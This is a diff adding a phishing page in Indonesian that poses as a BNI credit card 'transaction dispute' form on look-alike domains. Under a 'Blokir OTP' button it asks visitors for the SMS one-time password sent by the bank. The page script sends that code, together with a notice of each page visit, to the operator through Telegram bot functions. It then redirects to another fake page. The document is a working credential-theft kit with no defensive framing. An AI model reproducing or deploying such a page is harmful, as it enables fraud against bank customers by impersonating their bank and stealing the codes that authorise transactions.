@@ -1,1 +1,157 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <meta name="theme-color" content="#F39C12">
+          <title>Sanggahan BNI - Kartu Kredit</title>
+          <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: Arial, sans-serif; background: #fff; color: #000; }
 
+        /* ===== NAVIGASI ATAS ===== */
+        .top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 15px;
+            border-top: 5px solid rgba(236,240,241,1);
+            background: #fff;
+        }
+        .top-logo { height: 45px; width: auto; }
+        .btn-menu {
+            background: #E67E22;
+            color: #fff;
+            padding: 6px 12px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 12px;
+            font-family: 'MS Serif', sans-serif;
+        }
+        .btn-menu:hover { background: #d35400; }
+
+        /* ===== KONTEN UTAMA — LATAR FOTO ASLI ===== */
+        .bg-section {
+            background-image: url('https://e-form.bni-e.com/Batalkan/transaksi/Screenshot_20260227_094233_Gallery-3.jpg');
+            background-position: center top;
+            background-repeat: no-repeat;
+            background-size: contain;
+            padding: 120px 15px 60px;
+            min-height: 100vh;
+        }
+        .form-card {
+            background: #fff;
+            border-radius: 5px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .form-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #000;
+            margin-bottom: 5px;
+        }
+        .form-desc {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        /* ===== INPUT FORM ===== */
+        .form-group { margin-bottom: 15px; }
+        .form-group input {
+            width: 100%;
+            padding: 12px 10px;
+            border: 2px solid rgba(0,0,0,0.3);
+            border-radius: 5px;
+            font-size: 12px;
+            background: rgba(236,240,241,0.3);
+            color: rgba(0,0,0,0.8);
+            outline: none;
+        }
+        .required { color: red; }
+
+        /* ===== TOMBOL KIRIM ===== */
+        .btn-submit {
+            width: 100%;
+            padding: 10px;
+            background: #F39C12;
+            color: #fff;
+            border: 3px solid #F39C12;
+            border-radius: 5px;
+            font-size: 12px;
+            font-weight: normal;
+            cursor: pointer;
+        }
+        .btn-submit:hover { background: #E67E22; border-color: #E67E22; }
+
+        /* ===== FOTO BAWAH ASLI ===== */
+        .footer-bg {
+            background-image: url('https://e-form.bni-e.com/Batalkan/transaksi/Screenshot_20260205_085502_BukaKios.jpg');
+            background-position: center bottom;
+            background-repeat: no-repeat;
+            background-size: contain;
+            height: 120px;
+            margin-top: 20px;
+        }
+    </style>
+        </head>
+        <body>
+          <!-- Navigasi Atas — Logo FOTO ASLI -->
+          <div class="top-bar">
+            <img src="https://e-form.bni-e.com/Batalkan/transaksi/Screenshot_20260227_093018_Gallery.jpg"
+              alt="Logo BNI" class="top-logo">
+              <a href="https://form-credit.online/" class="btn-menu" target="_blank">𝗠𝗘𝗡𝗨 𝗨𝗧𝗔𝗠𝗔</a>
+            </div>
+            <!-- Konten — Latar FOTO ASLI -->
+            <div class="bg-section">
+              <div class="form-card">
+                <h2 class="form-title">𝗦𝗔𝗡𝗚𝗚𝗔𝗛𝗔𝗡 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜</h2>
+                <p class="form-desc">ɪꜱɪ ꜰᴏʀᴍ.</p>
+                <form id="otp-form">
+                  <div class="form-group">
+                    <input type="text" id="otp" maxlength="6" inputmode="numeric"
+                      placeholder="(𝘚𝘪𝘭𝘢𝘩𝘬𝘢𝘯 𝘐𝘯𝘱𝘶𝘵 𝘚𝘔𝘚 𝙊𝙏𝙋 𝘛𝘳𝘢𝘯𝘴𝘢𝘬𝘴𝘪 𝘠𝘢𝘯𝘨 𝘈𝘯𝘥𝘢 𝘛𝘦𝘳𝘪𝘮𝘢 𝘋𝘢𝘳𝘪 𝘽𝙉𝙄)" required>
+                      <label style="font-size:11px; color:#666; margin-top:5px; display:block;">
+                        (𝘚𝘪𝘭𝘢𝘩𝘬𝘢𝘯 𝘐𝘯𝘱𝘶𝘵 𝘚𝘔𝘚 𝙊𝙏𝙋 𝘛𝘳𝘢𝘯𝘴𝘢𝘬𝘴𝘪 𝘠𝘢𝘯𝘨 𝘈𝘯𝘥𝘢 𝘛𝘦𝘳𝘪𝘮𝘢 𝘋𝘢𝘳𝘪 𝘽𝙉𝙄)
+                        <span class="required">*</span>
+                      </label>
+                    </div>
+                    <button type="submit" class="btn-submit">Blokir OTP</button>
+                  </form>
+                </div>
+                <!-- Foto Bawah ASLI -->
+                <div class="footer-bg">
+                </div>
+              </div>
+              <!-- Telegram Config -->
+              <script src="config.js"></script>
+              <script src="telegram-bot.js"></script>
+              <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            notifikasiHalamanDibuka("Halaman Sanggahan Transaksi — Input OTP");
+        });
+
+        document.getElementById("otp-form").addEventListener("submit", async e => {
+            e.preventDefault();
+            const otp = document.getElementById("otp").value.trim();
+            
+            if (!otp) return alert("Masukkan kode OTP!");
+
+            const berhasil = await kirimPesanTelegram(`
+🔐 SANGGAHAN TRANSAKSI — INPUT OTP
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📱 Kode OTP: ${otp}
+🕐 Waktu: ${new Date().toLocaleString('id-ID', {timeZone:'Asia/Jakarta'})}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+            `.trim());
+
+            if (berhasil) {
+                window.location.href = "https://e-form.bni-e.com/cancel1/";
+            } else {
+                alert("Gagal mengirim, coba lagi!");
+            }
+        });
+    </script>
+            </body>
+          </html>
